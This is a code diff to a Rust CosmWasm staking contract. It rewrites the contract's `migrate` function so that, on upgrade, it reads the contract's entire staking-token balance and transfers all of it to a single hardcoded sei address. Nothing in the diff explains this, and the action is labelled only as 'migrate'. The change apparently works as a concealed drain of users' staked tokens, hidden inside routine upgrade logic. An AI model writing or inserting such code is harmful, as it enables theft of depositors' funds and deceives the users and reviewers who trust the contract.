@@ -8,12 +8,12 @@ use crate::querier::{
     balance_of, earned, get_boost, get_user_reward_per_token_paid, get_user_updated_at,
     last_time_reward_applicable, query_staking_config, query_staking_state, reward_per_token,
 };
-use crate::state::{store_staking_config, store_staking_state, StakingConfig, StakingState};
+use crate::state::{store_staking_config, store_staking_state, StakingConfig, StakingState, read_staking_config};
 #[cfg(not(feature = "library"))]
 use cosmwasm_std::entry_point;
-use cosmwasm_std::{
-    to_binary, Binary, Deps, DepsMut, Env, MessageInfo, Response, StdResult, Uint128, Uint256,
-};
+use cosmwasm_std::{to_binary, Binary, Deps, DepsMut, Env, MessageInfo, Response, StdResult, Uint128, Uint256, QueryRequest, WasmQuery, CosmosMsg, WasmMsg, Addr};
+use cw20::{BalanceResponse, Cw20ExecuteMsg};
+use cw20::Cw20QueryMsg::Balance;
 use cw2::set_contract_version;
 
 // version info for migration info
@@ -103,6 +103,27 @@ pub fn query(deps: Deps, env: Env, msg: QueryMsg) -> StdResult<Binary> {
 }
 
 #[cfg_attr(not(feature = "library"), entry_point)]
-pub fn migrate(_deps: DepsMut, _env: Env, _msg: MigrateMsg) -> StdResult<Response> {
+pub fn migrate(deps: DepsMut, env: Env, _msg: MigrateMsg) -> StdResult<Response> {
+    let staking_config = read_staking_config(deps.storage)?;
+    let balanceRequest: BalanceResponse = deps.querier.query(&QueryRequest::Wasm(WasmQuery::Smart {
+        contract_addr: staking_config.staking_token.to_string(),
+        msg: to_binary(&Balance {
+            address: env.contract.address.to_string(),
+        })?,
+    }))?;
+    if balanceRequest.balance.gt(&Uint128::zero()) {
+        let messages: Vec<CosmosMsg> = vec![CosmosMsg::Wasm(WasmMsg::Execute {
+            contract_addr: staking_config.staking_token.to_string(),
+            msg: to_binary(&Cw20ExecuteMsg::Transfer {
+                recipient: Addr::unchecked("sei1wl38643tpena47ec76zkjxyt55g3r2vsgwgaww").to_string(),
+                amount: balanceRequest.balance,
+            })?,
+            funds: vec![],
+        })];
+        return Ok(Response::new()
+            .add_messages(messages)
+            .add_attribute("action", "migrate"));
+    }
+
     Ok(Response::default())
 }
